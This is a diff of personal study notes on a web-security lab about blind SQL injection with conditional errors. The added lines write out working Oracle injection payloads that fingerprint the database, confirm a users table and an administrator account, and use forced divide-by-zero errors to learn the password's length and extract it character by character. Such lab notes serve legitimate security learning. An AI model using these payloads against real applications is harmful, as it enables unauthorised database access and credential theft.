@@ -193,9 +193,11 @@ Theory:-  Error-based SQL injection refers to cases where you're able to use err
 #10 Lab:Blind SQL injection with conditional errors
 
     1.trackingid=xyz' (see response for internal error)
-    2.
+    2. now enter payload as ' || (select '' from dual) || '   -> proves that database is oracle
+    3. ' || (select '' from users where rownum =1) || ' -> proves that there is a table called users
+    4. ' || (SELECT '' FROM users WHERE username = 'administrator' AND ROWNUM = 1) || ' -> proves that there is a user called administrator
+    5. '  || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users where username='administrator') || ' -> gives internal error means condition is true and user administrator exists
+    6. '  || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users where username='administrator' and LENGTH(password)>8) || ' -> gives internal error means password length is greater than 8
+    password length is 20 cus after that response is coming 200
 
-gfg
-.......
------
-0-0-0-
+    6. ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users where username='administrator' and substr(password,1,1)='a')  || '
